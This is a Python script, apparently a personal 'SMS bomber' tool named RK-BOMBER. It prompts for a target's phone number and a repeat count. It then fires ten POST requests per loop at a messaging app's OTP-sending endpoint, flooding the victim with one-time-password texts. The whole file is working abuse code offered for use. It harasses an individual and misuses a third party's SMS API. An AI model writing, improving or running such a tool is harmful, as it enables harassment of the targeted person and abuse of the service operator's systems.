import requests

from requests.structures import CaseInsensitiveDict

import os

import sys

import time

os.system

os.system("clear")

red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

purple="\033[0;35m"

on_green="\033[42m"       # Green

logo=(green+""" 
██████  ██   ██       ██████   ██████  ███    ███ ██████  ███████ ██████   ██   ██ ██  ██        ██   ██ ██    ██ ████  ████ ██   ██ ██      ██   ██  ██████  █████   █████ ██████  ██    ██ ██ ████ ██ ██████  █████   ██████   ██   ██ ██  ██        ██   ██ ██    ██ ██  ██  ██ ██   ██ ██      ██   ██  ██   ██ ██   ██       ██████   ██████  ██      ██ ██████  ███████ ██   ██                                                                                                                                                        """)
                                                  



line=(yellow+"======================================================================")
tversion=(cyan+"\t\t   Version : 0.1 ")

line2=("\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~")
 
dtls=(yellow+"\t\t Created By: RK-RaiHaN-KhaN ")

note=(cyan+"Note: This is My Personal Tools.")

print(logo)

print(" ")

print(dtls)

print(tversion)

print(line)

print(note)

print(line)





print(' ')

number=str(input(red+"[➙] Enter Terget Number : "))
amount=int(input(green+"[➙] Enter The Amount : "))

url1 = "https://api.maya-apa.com/api/v5/app/send_otp"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone=88"+number+"&device_id=fbcd0de286304cba&source=app&lat=23.1634554&long=89.577101"


url2 = "https://api.maya-apa.com/api/v5/app/send_otp"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/x-www-form-urlencoded"

data2 = "phone=88"+number+"&device_id=fbcd0de286304cba&source=app&lat=23.1634554&long=89.577101"

url3 = "https://api.maya-apa.com/api/v5/app/send_otp"

headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/x-www-form-urlencoded"

data3 = "phone=88"+number+"&device_id=fbcd0de286304cba&source=app&lat=23.1634554&long=89.577101"

url4 = "https://api.maya-apa.com/api/v5/app/send_otp"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/x-www-form-urlencoded"

data4 = "phone=88"+number+"&device_id=fbcd0de286304cba&source=app&lat=23.1634554&long=89.577101"

url5 = "https://api.maya-apa.com/api/v5/app/send_otp"

headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/x-www-form-urlencoded"

data5 = "phone=88"+number+"&device_id=fbcd0de286304cba&source=app&lat=23.1634554&long=89.577101"

url6 = "https://api.maya-apa.com/api/v5/app/send_otp"

headers6 = CaseInsensitiveDict()
headers6["Content-Type"] = "application/x-www-form-urlencoded"

data6 = "phone=88"+number+"&device_id=fbcd0de286304cba&source=app&lat=23.1634554&long=89.577101"

url7 = "https://api.maya-apa.com/api/v5/app/send_otp"

headers7 = CaseInsensitiveDict()
headers7["Content-Type"] = "application/x-www-form-urlencoded"

data7 = "phone=88"+number+"&device_id=fbcd0de286304cba&source=app&lat=23.1634554&long=89.577101"

url8 = "https://api.maya-apa.com/api/v5/app/send_otp"

headers8 = CaseInsensitiveDict()
headers8["Content-Type"] = "application/x-www-form-urlencoded"

data8 = "phone=88"+number+"&device_id=fbcd0de286304cba&source=app&lat=23.1634554&long=89.577101"

url9 = "https://api.maya-apa.com/api/v5/app/send_otp"

headers9 = CaseInsensitiveDict()
headers9["Content-Type"] = "application/x-www-form-urlencoded"

data9 = "phone=88"+number+"&device_id=fbcd0de286304cba&source=app&lat=23.1634554&long=89.577101"

url10 = "https://api.maya-apa.com/api/v5/app/send_otp"

headers10 = CaseInsensitiveDict()
headers10["Content-Type"] = "application/x-www-form-urlencoded"

data10 = "phone=88"+number+"&device_id=fbcd0de286304cba&source=app&lat=23.1634554&long=89.577101"

import requests
from requests.structures import CaseInsensitiveDict




for i in range (amount):
	resp1 = requests.post(url1, headers=headers1, data=data1)
	resp2 = requests.post(url2, headers=headers2, data=data2)
	resp3 = requests.post(url3, headers=headers3, data=data3)
	resp4 = requests.post(url4, headers=headers4, data=data4)
	resp5 = requests.post(url5, headers=headers5, data=data5)
	resp6 = requests.post(url6, headers=headers6, data=data6)
	resp7 = requests.post(url7, headers=headers7, data=data7)
	resp8 = requests.post(url8, headers=headers8, data=data8)
	resp9 = requests.post(url9, headers=headers9, data=data9)
	resp10 = requests.post(url10, headers=headers10, data=data10)

	
	

	print(str(i+1)+yellow+'.	➙ successfully SMS Sent ✅')
	
print('					')
print(red+'\t\tThank You RK-BOMBER ')

